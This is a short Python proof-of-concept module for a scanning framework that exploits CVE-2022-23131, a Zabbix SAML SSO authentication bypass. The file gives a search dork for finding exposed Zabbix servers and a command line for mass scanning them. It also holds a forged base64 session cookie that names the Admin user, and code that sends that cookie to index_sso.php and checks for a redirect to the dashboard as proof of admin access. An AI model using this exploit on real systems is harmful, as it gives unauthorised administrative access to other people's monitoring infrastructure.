#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   Zabbix_SAML_SSO_Authentication_BypassCVE-2022-23131.py
@DateTime:  2023/9/12 23:25


@Dork
    'app="ZABBIX-监控系统" && body="saml"'


@Cmdline
    python POC-T.py -s  Zabbix_SAML_SSO_Authentication_BypassCVE-2022-23131.py -aF app="ZABBIX-监控系统" && body="saml"


@Request
```
GET "{{BaseURL}}/zabbix/index_sso.php"
GET "{{BaseURL}}/index_sso.php"
Cookie: "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"

```

@Expected Response
    302
    location = "zabbix.php?action=dashboard.view"
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/index_sso.php")
    cookie = {"Cookie": "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"}
    resp = request_ex("get", url, headers=cookie, allow_redirects=False)

    if resp:
        location = resp.headers.get("location", "")
        if resp.status_code == 302 and location == "zabbix.php?action=dashboard.view":
            return True

    return False
